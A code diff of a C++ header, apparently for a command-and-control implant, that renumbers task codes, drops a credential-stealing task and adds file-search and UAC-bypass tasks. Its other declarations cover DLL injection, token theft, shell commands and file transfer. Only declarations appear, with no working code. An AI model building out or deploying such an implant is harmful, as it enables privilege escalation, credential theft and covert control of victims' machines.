@@ -45,10 +45,10 @@
 #define TASK_CMD                0x04
 #define TASK_CONNECT            0x05
 #define TASK_CP                 0x06
-#define TASK_CREDS_STEAL        0x07
-#define TASK_DLL                0x08
-#define TASK_DOWNLOAD           0x09
-#define TASK_ENV_LS             0x10
+#define TASK_DLL                0x07
+#define TASK_DOWNLOAD           0x08
+#define TASK_ENV_LS             0x09
+#define TASK_FIND               0x10
 #define TASK_GROUP_LS           0x11
 #define TASK_HISTORY            0x12
 #define TASK_IP                 0x13
@@ -79,10 +79,11 @@
 #define TASK_SLEEP              0x38
 #define TASK_TOKEN_REVERT       0x39
 #define TASK_TOKEN_STEAL        0x40
-#define TASK_UPLOAD             0x41
-#define TASK_USER_LS            0x42
-#define TASK_WHOAMI             0x43
-#define TASK_WHOAMI_PRIV        0x44
+#define TASK_UAC                0x41
+#define TASK_UPLOAD             0x42
+#define TASK_USER_LS            0x43
+#define TASK_WHOAMI             0x44
+#define TASK_WHOAMI_PRIV        0x45
 
 namespace Task
 {
@@ -95,6 +96,15 @@ namespace Task
             State::PSTATE pState,
             const std::wstring& wUserName,
             const std::wstring& wUserSID
+        );
+    }
+
+    namespace Helper::Find
+    {
+        std::wstring FindFiles(
+            State::PSTATE pState,
+            const std::wstring& wPath,
+            const std::wstring& wName
         );
     }
 
@@ -133,10 +143,10 @@ namespace Task
     std::wstring Cmd(State::PSTATE pState, const std::wstring& wCmd);
     std::wstring Connect(State::PSTATE pState, const std::wstring& wListenerURL);
     std::wstring Cp(State::PSTATE pState, const std::wstring& wSrc, const std::wstring& wDest);
-    std::wstring CredsSteal(State::PSTATE pState);
     std::wstring Dll(State::PSTATE pState, const std::wstring& wPid, const std::wstring& wSrc, const std::wstring& wTechnique);
     std::wstring Download(State::PSTATE pState, const std::wstring& wSrc, const std::wstring& wDest);
     std::wstring EnvLs(State::PSTATE pState);
+    std::wstring Find(State::PSTATE pState, const std::wstring& wPath, const std::wstring& wName);
     std::wstring GroupLs();
     std::wstring History(State::PSTATE pState);
     std::wstring Ip();
@@ -167,6 +177,7 @@ namespace Task
     std::wstring SleepSet(State::PSTATE pState, const std::wstring& wSleep);
     std::wstring TokenRevert();
     std::wstring TokenSteal(State::PSTATE pState, const std::wstring& wPid, const std::wstring& wProcName, bool bLogin);
+    std::wstring Uac(State::PSTATE pState, const std::wstring& wTechnique);
     std::wstring Upload(State::PSTATE pState, const std::wstring& wSrc, const std::wstring& wDest);
     std::wstring Users(State::PSTATE pState);
     std::wstring Whoami(State::PSTATE pState);
